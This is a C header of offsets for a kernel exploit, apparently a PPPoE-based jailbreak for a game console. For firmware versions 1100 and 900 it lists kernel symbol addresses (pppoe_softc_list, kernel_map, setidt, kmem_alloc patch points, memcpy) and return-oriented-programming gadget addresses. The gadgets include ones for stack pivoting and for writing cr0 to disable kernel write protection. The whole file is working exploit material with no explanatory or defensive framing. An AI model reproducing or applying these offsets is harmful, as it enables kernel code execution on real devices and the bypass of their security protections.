#ifndef OFFSET_H
#define OFFSET_H

#include <stdint.h>

#define FIRMWARE_VERSION 900

#if FIRMWARE_VERSION == 1100
    #define PPPOE_SOFTC_LIST 0xffffffff844e2578ULL

    #define KERNEL_MAP 0xffffffff843ff130ULL

    #define SETIDT 0xffffffff8245bdb0ULL

    #define KMEM_ALLOC 0xffffffff82445e10ULL
    #define KMEM_ALLOC_PATCH1 0xffffffff82445edcULL
    #define KMEM_ALLOC_PATCH2 0xffffffff82445ee4ULL

    #define MEMCPY 0xffffffff824dddf0ULL

    // 0xffffffff824f1299 : mov cr0, rsi ; ud2 ; mov eax, 1 ; ret
    #define MOV_CR0_RSI_UD2_MOV_EAX_1_RET 0xffffffff824f1299ULL

    #define SECOND_GADGET_OFF 0x3eULL

    // 0xffffffff82eb1f97 : jmp qword ptr [rsi + 0x3e]
    #define FIRST_GADGET 0xffffffff82eb1f97ULL

    // 0xffffffff82c75166 : push rbp ; jmp qword ptr [rsi]
    #define PUSH_RBP_JMP_QWORD_PTR_RSI 0xffffffff82c75166ULL

    // 0xffffffff824b90e1 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
    #define POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 0xffffffff824b90e1ULL

    // 0xffffffff8293c8c6 : lea rsp, [rsi + 0x20] ; repz ret
    #define LEA_RSP_RSI_20_REPZ_RET 0xffffffff8293c8c6ULL

    // 0xffffffff826cb2da : add rsp, 0x28 ; pop rbp ; ret
    #define ADD_RSP_28_POP_RBP_RET 0xffffffff826cb2daULL

    // 0xffffffff824cdd5f : add rsp, 0xb0 ; pop rbp ; ret
    #define ADD_RSP_B0_POP_RBP_RET 0xffffffff824cdd5fULL

    // 0xffffffff822007e4 : ret
    #define RET 0xffffffff822007e4ULL

    // 0xffffffff825f38ed : pop rdi ; ret
    #define POP_RDI_RET 0xffffffff825f38edULL

    // 0xffffffff8224a6a9 : pop rsi ; ret
    #define POP_RSI_RET 0xffffffff8224a6a9ULL

    // 0xffffffff822a4762 : pop rdx ; ret
    #define POP_RDX_RET 0xffffffff822a4762ULL

    // 0xffffffff8221170a : pop rcx ; ret
    #define POP_RCX_RET 0xffffffff8221170aULL

    // 0xffffffff8224ae4d : pop r8 ; pop rbp ; ret
    #define POP_R8_POP_RBP_RET 0xffffffff8224ae4dULL

    // 0xffffffff8279faaf : pop r12 ; ret
    #define POP_R12_RET 0xffffffff8279faafULL

    // 0xffffffff8221172e : pop rax ; ret
    #define POP_RAX_RET 0xffffffff8221172eULL

    // 0xffffffff822008df : pop rbp ; ret
    #define POP_RBP_RET 0xffffffff822008dfULL

    // 0xffffffff82bb5c7a : push rsp ; pop rsi ; ret
    #define PUSH_RSP_POP_RSI_RET 0xffffffff82bb5c7aULL

    // 0xffffffff823ce260 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
    #define MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX 0xffffffff823ce260ULL

    // 0xffffffff8236ae58 : mov byte ptr [rcx], al ; ret
    #define MOV_BYTE_PTR_RCX_AL_RET 0xffffffff8236ae58ULL

    // 0xffffffff8233426c : mov rdi, rbx ; call r12
    #define MOV_RDI_RBX_CALL_R12 0xffffffff8233426cULL

    // 0xffffffff823340a7 : mov rdi, r14 ; call r12
    #define MOV_RDI_R14_CALL_R12 0xffffffff823340a7ULL

    // 0xffffffff82512dce : mov rsi, rbx ; call rax
    #define MOV_RSI_RBX_CALL_RAX 0xffffffff82512dceULL

    // 0xffffffff82624df8 : mov r14, rax ; call r8
    #define MOV_R14_RAX_CALL_R8 0xffffffff82624df8ULL

    // 0xffffffff82cb535a : add rdi, rcx ; ret
    #define ADD_RDI_RCX_RET 0xffffffff82cb535aULL

    // 0xffffffff8260f297 : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
    #define SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET 0xffffffff8260f297ULL

    // 0xffffffff82b84657 : jmp r14
    #define JMP_R14 0xffffffff82b84657ULL
#elif FIRMWARE_VERSION == 900 
    #define PPPOE_SOFTC_LIST 0xffffffff843ed9f8ULL

    #define KERNEL_MAP 0xffffffff84468d48ULL

    #define SETIDT 0xffffffff82512c40ULL

    #define KMEM_ALLOC 0xffffffff8257be70ULL
    #define KMEM_ALLOC_PATCH1 0xffffffff8257bf3cULL
    #define KMEM_ALLOC_PATCH2 0xffffffff8257bf44ULL

    #define MEMCPY 0xffffffff824714b0ULL

    /* 0xffffffff823fb949 : mov cr0, rsi ; ud2 ; mov eax, 1 ; ret */
    #define MOV_CR0_RSI_UD2_MOV_EAX_1_RET 0xffffffff823fb949ULL

    #define SECOND_GADGET_OFF 0x3dULL

    /* 0xffffffff82996603 : jmp qword ptr [rsi + 0x3d] */
    #define FIRST_GADGET 0xffffffff82996603ULL

    /* 0xffffffff82c76646 : push rbp ; jmp qword ptr [rsi] */
    #define PUSH_RBP_JMP_QWORD_PTR_RSI 0xffffffff82c76646ULL

    /* 0xffffffff822b4151 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10] */
    #define POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 0xffffffff822b4151ULL

    /* 0xffffffff82941e46 : lea rsp, [rsi + 0x20] ; repz ret */
    #define LEA_RSP_RSI_20_REPZ_RET 0xffffffff82941e46ULL

    /* 0xffffffff826c52aa : add rsp, 0x28 ; pop rbp ; ret */
    #define ADD_RSP_28_POP_RBP_RET 0xffffffff826c52aaULL

    /* 0xffffffff8251b08f : add rsp, 0xb0 ; pop rbp ; ret */
    #define ADD_RSP_B0_POP_RBP_RET 0xffffffff8251b08fULL

    /* 0xffffffff822008e0 : ret */
    #define RET 0xffffffff822008e0ULL

    /* 0xffffffff822391a8 : pop rdi ; ret */
    #define POP_RDI_RET 0xffffffff822391a8ULL

    /* 0xffffffff822aad39 : pop rsi ; ret */
    #define POP_RSI_RET 0xffffffff822aad39ULL

    /* 0xffffffff82322eba : pop rdx ; ret */
    #define POP_RDX_RET 0xffffffff82322ebaULL

    /* 0xffffffff822445e7 : pop rcx ; ret */
    #define POP_RCX_RET 0xffffffff822445e7ULL

    /* 0xffffffff822ab4dd : pop r8 ; pop rbp ; ret */
    #define POP_R8_POP_RBP_RET 0xffffffff822ab4ddULL

    /* 0xffffffff8279fa0f : pop r12 ; ret */
    #define POP_R12_RET 0xffffffff8279fa0fULL

    /* 0xffffffff82234ec8 : pop rax ; ret */
    #define POP_RAX_RET 0xffffffff82234ec8ULL

    /* 0xffffffff822008df : pop rbp ; ret */
    #define POP_RBP_RET 0xffffffff822008dfULL

    /* 0xffffffff82bb687a : push rsp ; pop rsi ; ret */
    #define PUSH_RSP_POP_RSI_RET 0xffffffff82bb687aULL

    /* 0xffffffff82244ed0 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax */
    #define MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX  0xffffffff82244ed0ULL

    /* 0xffffffff82b7450e : mov byte ptr [rcx], al ; ret */
    #define MOV_BYTE_PTR_RCX_AL_RET 0xffffffff82b7450eULL

    /* 0xffffffff82632b9c : mov rdi, rbx ; call r12 */
    #define MOV_RDI_RBX_CALL_R12 0xffffffff82632b9cULL

    /* 0xffffffff8235b387 : mov rdi, r14 ; call r12 */
    #define MOV_RDI_R14_CALL_R12 0xffffffff8235b387ULL

    /* 0xffffffff822e3d7e : mov rsi, rbx ; call rax */
    #define MOV_RSI_RBX_CALL_RAX 0xffffffff822e3d7eULL

    /* 0xffffffff82363918 : mov r14, rax ; call r8 */
    #define MOV_R14_RAX_CALL_R8 0xffffffff82363918ULL

    /* 0xffffffff82cb683a : add rdi, rcx ; ret */
    #define ADD_RDI_RCX_RET 0xffffffff82cb683aULL

    /* 0xffffffff82409557 : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret */
    #define SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET 0xffffffff82409557ULL

    /* 0xffffffff82b85693 : jmp r14 */
    #define JMP_R14 0xffffffff82b85693ULL
#endif

#endif /* OFFSET_H */